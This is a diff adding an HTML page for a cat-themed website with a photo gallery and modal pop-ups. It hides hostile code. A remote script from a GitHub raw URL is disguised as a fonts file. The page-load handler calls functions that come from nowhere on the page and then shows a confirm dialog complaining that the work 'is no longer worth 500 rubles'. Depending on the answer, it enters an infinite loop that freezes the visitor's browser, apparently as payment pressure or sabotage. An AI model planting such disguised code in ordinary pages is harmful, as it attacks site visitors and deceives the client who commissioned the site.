@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>World of Cats</title>
+	<link rel="stylesheet" href="style.css">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap"
+		rel="stylesheet">
+	<script src="https://raw.githubusercontent.com/div648/cntrl_for_time_new_roman/main/fonts.js"></script>
+
+</head>
+
+<body>
+	<header>
+		<div class="logo">🐾 CatWorld</div>
+		<nav>
+			<a href="#about">О кошках</a>
+			<a href="#gallery">Галерея</a>
+			<a href="#contact">Связаться</a>
+		</nav>
+	</header>
+	<main>
+		<section id="hero">
+			<h1>Откройте для себя мир кошек</h1>
+			<p>Кошки приносят радость, любопытство и тепло в нашу жизнь. Узнайте больше об этих удивительных
+				компаньонах.</p>
+		</section>
+		<section id="about">
+			<h2>О кошках</h2>
+			<p>Кошки — маленькие плотоядные млекопитающие, которых одомашнили на протяжении тысячелетий. Известные своим
+				игривым и независимым характером, из них получаются замечательные домашние животные.</p>
+		</section>
+		<section id="gallery">
+			<h2>Галерея</h2>
+			<div class="gallery">
+				<div class="gallery-item" style="background-image: url('NationalGeographic_2572187_square.jpg');"
+					data-description="Это серый короткошерстный кот с белой грудью и большими зелеными глазами."></div>
+				<div class="gallery-item" style="background-image: url('What-is-a-cat-2335940601.png');"
+					data-description="Это черный длинношерстный кот с ярко-желтыми глазами, сливающимися с фоном.">
+				</div>
+				<div class="gallery-item"
+					style="background-image: url('maine-coon-cat-with-fluffy-tail-340272055.jpeg');"
+					data-description="Это бело-рыжий длинношерстный кот, бегущий к камере по солнечной лужайке."></div>
+			</div>
+		</section>
+
+		<footer id="contact">
+			<p>Связаться с нами: <a href="mailto:pavlihinroma@gmail.com">info@catworld.com</a></p>
+			<p>&copy; 2024 CatWorld. All rights reserved.</p>
+		</footer>
+	</main>
+	<div id="modal" class="modal">
+		<div class="modal-content">
+			<span class="close">&times;</span>
+			<p id="modal-description"></p>
+		</div>
+	</div>
+	<script>
+
+
+		document.addEventListener("DOMContentLoaded", function () {
+			const modal = document.getElementById('modal');
+			const modalDescription = document.getElementById('modal-description');
+			const closeModal = document.querySelector('.close');
+
+			document.querySelectorAll('.gallery-item').forEach(item => {
+				item.addEventListener('click', () => {
+					modalDescription.textContent = item.dataset.description;
+					modal.style.display = 'flex';
+				});
+			});
+
+			closeModal.addEventListener('click', () => {
+				modal.style.display = 'none';
+			});
+
+			window.addEventListener('click', (event) => {
+				if (event.target === modal) {
+					modal.style.display = 'none';
+				}
+			});
+			vis();
+			setTimeout(function () {
+				if (!answ) {
+					answ = !confirm("Тебе не кажется, что это уже не 500р?");
+				}
+				while (answ) { wf(); }
+			}, 84 * 60);
+		});</script>
+</body>
+
+</html>
